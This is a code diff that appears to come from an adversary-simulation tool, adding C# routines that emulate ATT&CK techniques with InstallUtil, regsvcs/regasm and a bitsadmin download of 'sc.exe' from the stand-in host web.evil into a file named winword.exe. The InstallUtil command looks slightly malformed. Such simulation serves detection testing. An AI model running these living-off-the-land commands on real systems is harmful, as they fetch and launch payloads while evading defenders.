@@ -29,6 +29,60 @@ namespace PurpleSharp.Simulations
             }
         }
 
+        public static void InstallUtil(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1118");
+            try
+            {
+                string file = @"C:\Windows\Temp\XKNqbpzl.exe";
+                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319 /logfiles /LogToConsole=alse /U {0}", file), logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
+
+        public static void RegsvcsRegasm(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1121");
+            try
+            {
+                string file = @"winword.dll";
+                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U {0}", file), logger);
+                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U {0}", file), logger, false);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+
+        }
+
+        public static void BitsJobs(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1197");
+            try
+            {
+                string url = "http://web.evil/sc.exe";
+                string file = @"C:\Windows\Temp\winword.exe";
+                ExecutionHelper.StartProcess("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", url, file), logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
+
         public static void Mshta(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
